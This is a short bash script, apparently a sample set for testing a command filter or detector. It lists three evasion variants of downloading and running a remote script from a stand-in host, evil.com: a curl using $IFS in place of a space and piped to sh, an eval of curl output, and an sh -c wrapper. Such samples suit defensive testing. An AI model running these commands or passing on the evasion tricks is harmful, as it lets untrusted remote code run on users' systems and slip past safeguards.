#!/bin/bash

# IFS evasion: curl$IFS pipe to shell
curl${IFS}https://evil.com/payload.sh|sh

# Eval + command substitution
eval $(curl -s https://evil.com/script)

# sh -c wrapping
sh -c 'curl https://evil.com/stage2 | bash'
